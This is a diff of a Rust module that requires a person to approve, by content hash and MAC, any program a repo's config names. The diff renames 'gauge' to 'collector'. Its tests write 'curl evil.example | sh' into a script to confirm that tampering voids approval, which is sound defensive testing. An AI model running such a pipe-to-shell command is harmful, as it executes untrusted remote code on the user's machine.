@@ -1,7 +1,7 @@
 //! Consent to run programs from the project (tsk331, [[tsk162]]).
 //!
 //! A repo's `.oxplow/project.yaml` can name a program to run: an `exec`
-//! gauge or collection plugin, or (in an extension) an `exec` source. A
+//! collector or collection plugin, or (in an extension) an `exec` collector. A
 //! cloned or pulled repo is untrusted, so none of these run until a person
 //! approves the program on this machine. An approval is bound to a hash of
 //! what runs (the program's content, plus its args or its network list), so
@@ -11,8 +11,7 @@
 //! can't ship one, and an agent's shell can't forge one. Agents can't
 //! approve.
 //!
-//! Global-scope gauges are the user's own config and aren't gated.
-//! See `.context/semantic-layer.md` → "User and extension sources" and
+//! See `.context/semantic-layer.md` → "Collectors" and
 //! `.context/metrics.md`.
 
 use std::collections::BTreeMap;
@@ -49,7 +48,7 @@ struct ApprovalFile {
     /// The project these approvals are for (for a person reading it).
     #[serde(default)]
     project: String,
-    /// Approval key (`<ext>/<source>`, `gauge:<key>`, `plugin:<name>`,
+    /// Approval key (`<ext>/<collector>`, `collector:<id>`, `plugin:<name>`,
     /// `acp:<name>`) → the approved hash and its MAC.
     #[serde(default)]
     approved: BTreeMap<String, Approval>,
@@ -213,8 +212,8 @@ fn approvals_file(home: &Path, project_dir: &Path) -> std::path::PathBuf {
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, specta::Type)]
 #[serde(rename_all = "lowercase")]
 pub enum ProgramKind {
-    /// A metric gauge (`gauges:`).
-    Gauge,
+    /// A project collector's program (`collectors:` with `runtime: exec`).
+    Collector,
     /// A collection plugin (`collection.plugins`) parsing test/coverage/analysis reports.
     Plugin,
     /// An agent spoken to over ACP (`acpAgents`, tsk335).
@@ -233,7 +232,7 @@ pub enum ProgramKind {
 #[serde(rename_all = "camelCase")]
 pub struct ProjectProgram {
     pub kind: ProgramKind,
-    /// The gauge key or plugin name.
+    /// The collector id or plugin name.
     pub name: String,
     /// Project-relative path of the program.
     pub program: String,
@@ -258,7 +257,7 @@ pub struct ProjectProgram {
 impl ProjectProgram {
     pub fn key(&self) -> String {
         match self.kind {
-            ProgramKind::Gauge => format!("gauge:{}", self.name),
+            ProgramKind::Collector => format!("collector:{}", self.name),
             ProgramKind::Plugin => format!("plugin:{}", self.name),
             ProgramKind::AcpAgent => format!("acp:{}", self.name),
             ProgramKind::Advisories => format!("advisories:{}", self.name),
@@ -273,13 +272,13 @@ impl ProjectProgram {
 
     /// What its approval covers, as it would run with working dir `cwd`:
     /// - the program's content (when it's a file in the project), and for
-    ///   a gauge or plugin the other files in its directory (a script
+    ///   a collector or plugin the other files in its directory (a script
     ///   sourcing a helper) unless that directory is the project root;
     /// - every arg, and the content of each arg that names a file under
     ///   `cwd` (the script an interpreter like `node` runs);
     /// - its env.
     ///
-    /// A gauge or plugin names a project file, which must exist; an ACP
+    /// A collector or plugin names a project file, which must exist; an ACP
     /// agent's command may be a program on PATH, covered by its name.
     pub fn hash_at(&self, project_dir: &Path, cwd: &Path) -> std::io::Result<String> {
         use sha2::{Digest, Sha256};
@@ -292,7 +291,7 @@ impl ProjectProgram {
         let mut h = Sha256::new();
         let file = project_dir.join(&self.program);
         match self.kind {
-            ProgramKind::Gauge | ProgramKind::Plugin => {
+            ProgramKind::Collector | ProgramKind::Plugin => {
                 h.update(std::fs::read(&file)?);
                 if let Some(dir) = Path::new(&self.program)
                     .parent()
@@ -418,7 +417,7 @@ pub fn tree_hash_except(dir: &Path, skip: &dyn Fn(&Path) -> bool) -> std::io::Re
 /// What an approval of a program covers: its content and its args.
 pub fn program_hash(project_dir: &Path, program: &str, args: &[String]) -> std::io::Result<String> {
     ProjectProgram {
-        kind: ProgramKind::Gauge,
+        kind: ProgramKind::Collector,
         name: String::new(),
         program: program.to_string(),
         args: args.to_vec(),
@@ -579,7 +578,7 @@ pub fn may_run_acp(
 /// Why an unapproved program didn't run, for logs and errors.
 pub fn needs_approval(kind: ProgramKind, name: &str, program: &str) -> String {
     let what = match kind {
-        ProgramKind::Gauge => "gauge",
+        ProgramKind::Collector => "collector",
         ProgramKind::Plugin => "collection plugin",
         ProgramKind::AcpAgent => "ACP agent",
         ProgramKind::Advisories => "extension advisories",
@@ -591,7 +590,7 @@ pub fn needs_approval(kind: ProgramKind, name: &str, program: &str) -> String {
     )
 }
 
-/// Every project-scope exec gauge and collection plugin in `config`, with
+/// Every project-scope exec collector and collection plugin in `config`, with
 /// whether it's approved.
 pub fn list(
     store: &ApprovalStore,
@@ -615,17 +614,9 @@ pub fn list(
             version: None,
         });
     };
-    for g in &config.gauges {
-        let Some(c) = g.compute.as_ref() else {
-            continue;
-        };
-        if c.runtime == "exec" {
-            push(
-                ProgramKind::Gauge,
-                g.key.as_deref().unwrap_or_default(),
-                c.entry_file.as_deref(),
-                &c.args,
-            );
+    for c in &config.collectors {
+        if c.runtime == oxplow_config::collectors::CollectorRuntime::Exec {
+            push(ProgramKind::Collector, &c.id, c.entry.as_deref(), &[]);
         }
     }
     for p in &config.collection.plugins {
@@ -746,7 +737,7 @@ mod tests {
         std::fs::write(dir.path().join("tools/parse.sh"), "cat").unwrap();
         let cfg = config(
             dir.path(),
-            "gauges:\n  - key: repo.count\n    emits: [repo.n]\n    compute: { runtime: exec, entryFile: tools/count.sh, args: [--fast] }\n  - key: repo.star\n    emits: [repo.n]\n    compute: { runtime: starlark, entryFile: tools/x.star }\ncollection:\n  plugins:\n    - { name: acme.parse, kind: coverage, formats: [mine], runtime: exec, entryFile: tools/parse.sh }\n",
+            "collectors:\n  - { id: repo.count, runtime: exec, entry: tools/count.sh, facts: [repo.n] }\n  - { id: repo.star, runtime: starlark, entry: tools/x.star, facts: [repo.n] }\ncollection:\n  plugins:\n    - { name: acme.parse, kind: coverage, formats: [mine], runtime: exec, entryFile: tools/parse.sh }\n",
         );
         let listed = list(&st, dir.path(), &cfg, &[]);
         assert_eq!(
@@ -755,16 +746,16 @@ mod tests {
                 .map(|p| (p.kind, p.name.as_str(), p.approved))
                 .collect::<Vec<_>>(),
             vec![
-                (ProgramKind::Gauge, "repo.count", false),
+                (ProgramKind::Collector, "repo.count", false),
                 (ProgramKind::Plugin, "acme.parse", false)
             ],
             "only exec entries, none approved yet"
         );
-        let args = vec!["--fast".to_string()];
+        let args: Vec<String> = Vec::new();
         assert!(!may_run(
             &st,
             dir.path(),
-            ProgramKind::Gauge,
+            ProgramKind::Collector,
             "repo.count",
             "tools/count.sh",
             &args
@@ -774,7 +765,7 @@ mod tests {
             dir.path(),
             &cfg,
             &[],
-            ProgramKind::Gauge,
+            ProgramKind::Collector,
             "repo.count",
             &current(&st, dir.path(), &cfg, "repo.count"),
         )
@@ -782,7 +773,7 @@ mod tests {
         assert!(may_run(
             &st,
             dir.path(),
-            ProgramKind::Gauge,
+            ProgramKind::Collector,
             "repo.count",
             "tools/count.sh",
             &args
@@ -791,16 +782,16 @@ mod tests {
         assert!(!may_run(
             &st,
             dir.path(),
-            ProgramKind::Gauge,
+            ProgramKind::Collector,
             "repo.count",
             "tools/count.sh",
-            &[]
+            &["--fast".to_string()]
         ));
         std::fs::write(dir.path().join("tools/count.sh"), "curl evil.example | sh").unwrap();
         assert!(!may_run(
             &st,
             dir.path(),
-            ProgramKind::Gauge,
+            ProgramKind::Collector,
             "repo.count",
             "tools/count.sh",
             &args
@@ -909,14 +900,14 @@ mod tests {
         std::fs::write(dir.path().join("tools/count.sh"), "curl x | sh").unwrap();
         let cfg = config(
             dir.path(),
-            "gauges:\n  - key: repo.count\n    emits: [repo.n]\n    compute: { runtime: exec, entryFile: tools/count.sh }\n",
+            "collectors:\n  - { id: repo.count, runtime: exec, entry: tools/count.sh, facts: [repo.n] }\n",
         );
         let hash = program_hash(dir.path(), "tools/count.sh", &[]).unwrap();
         let may = |st: &ApprovalStore| {
             may_run(
                 st,
                 dir.path(),
-                ProgramKind::Gauge,
+                ProgramKind::Collector,
                 "repo.count",
                 "tools/count.sh",
                 &[],
@@ -926,7 +917,7 @@ mod tests {
         // A committed (or agent-written) file in the repo, with the right hash.
         std::fs::write(
             dir.path().join(".oxplow").join(LEGACY_APPROVALS_FILE),
-            format!("{{\"approved\":{{\"gauge:repo.count\":\"{hash}\"}}}}"),
+            format!("{{\"approved\":{{\"collector:repo.count\":\"{hash}\"}}}}"),
         )
         .unwrap();
         assert!(!may(&st));
@@ -937,7 +928,7 @@ mod tests {
         std::fs::write(
             &f,
             format!(
-                "{{\"approved\":{{\"gauge:repo.count\":{{\"hash\":\"{hash}\",\"mac\":\"00\"}}}}}}"
+                "{{\"approved\":{{\"collector:repo.count\":{{\"hash\":\"{hash}\",\"mac\":\"00\"}}}}}}"
             ),
         )
         .unwrap();
@@ -950,7 +941,7 @@ mod tests {
             dir.path(),
             &cfg,
             &[],
-            ProgramKind::Gauge,
+            ProgramKind::Collector,
             "repo.count",
             &current(&st, dir.path(), &cfg, "repo.count"),
         )
@@ -971,13 +962,13 @@ mod tests {
         std::fs::write(dir.path().join("tools/agent.js"), "v1").unwrap();
         let cfg = config(
             dir.path(),
-            "gauges:\n  - key: repo.count\n    emits: [repo.n]\n    compute: { runtime: exec, entryFile: tools/count.sh }\nacpAgents:\n  - { name: js, command: node, args: [tools/agent.js] }\n",
+            "collectors:\n  - { id: repo.count, runtime: exec, entry: tools/count.sh, facts: [repo.n] }\nacpAgents:\n  - { name: js, command: node, args: [tools/agent.js] }\n",
         );
         let gauge_ok = |st: &ApprovalStore| {
             may_run(
                 st,
                 dir.path(),
-                ProgramKind::Gauge,
+                ProgramKind::Collector,
                 "repo.count",
                 "tools/count.sh",
                 &[],
@@ -988,7 +979,7 @@ mod tests {
             dir.path(),
             &cfg,
             &[],
-            ProgramKind::Gauge,
+            ProgramKind::Collector,
             "repo.count",
             &current(&st, dir.path(), &cfg, "repo.count"),
         )
@@ -1046,7 +1037,7 @@ mod tests {
         std::fs::write(dir.path().join("tools/count.sh"), "echo 1").unwrap();
         let cfg = config(
             dir.path(),
-            "gauges:\n  - key: repo.count\n    emits: [repo.n]\n    compute: { runtime: exec, entryFile: tools/count.sh }\n",
+            "collectors:\n  - { id: repo.count, runtime: exec, entry: tools/count.sh, facts: [repo.n] }\n",
         );
         let seen = list(&st, dir.path(), &cfg, &[])[0].version.clone().unwrap();
         // Swapped between the listing and the click: refused.
@@ -1056,7 +1047,7 @@ mod tests {
             dir.path(),
             &cfg,
             &[],
-            ProgramKind::Gauge,
+            ProgramKind::Collector,
             "repo.count",
             &seen,
         )
@@ -1069,7 +1060,7 @@ mod tests {
             dir.path(),
             &cfg,
             &[],
-            ProgramKind::Gauge,
+            ProgramKind::Collector,
             "repo.count",
             &now,
         )
